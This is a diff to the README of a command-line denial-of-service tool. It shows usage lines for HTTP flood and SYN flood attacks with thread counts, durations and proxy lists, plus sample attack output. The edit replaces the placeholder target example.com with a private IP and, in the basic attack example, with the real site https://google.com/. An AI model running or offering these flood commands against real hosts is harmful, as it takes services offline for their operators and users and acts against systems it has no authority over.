@@ -62,7 +62,7 @@ OPENAI_API_KEY=your_openai_api_key_here
 ### Basic Attack
 To perform a basic attack with default settings:
 ```bash
-ddos -u http://example.com/
+ddos -u https://google.com/
 ```
 
 ### Command-Line Arguments:
@@ -82,7 +82,7 @@ ddos -u http://example.com/
 ### Example Usage:
 1. Perform an HTTP flood attack with 20 threads, 0.1s pause time, and for 300 seconds:
 ```bash
-ddos -u http://example.com -t 20 -p 0.1 -d 300
+ddos -u http://192.168.48.165/ -t 20 -p 0.1 -d 300
 ```
 
 2. Perform a SYN flood attack on IP `192.168.48.165` for 60 seconds:
@@ -92,17 +92,17 @@ ddos -u 192.168.48.165 --attack-mode syn-flood -d 60
 
 3. Use proxies for the attack:
 ```bash
-ddos -u http://example.com --proxies proxies.txt
+ddos -u http://192.168.48.165 --proxies proxies.txt
 ```
 
 4. Save attack results to a JSON file:
 ```bash
-ddos -u http://example.com --results attack_results.json
+ddos -u http://192.168.48.165 --results attack_results.json
 ```
 
 ## Example Output
 ```bash
-Starting attack on http://example.com...
+Starting attack on http://192.168.48.165...
 Requests Sent: 100 | Successful: 98 | Failed: 2 | RPS: 50.00 | CPU: 45% | Memory: 32%
 ```
 
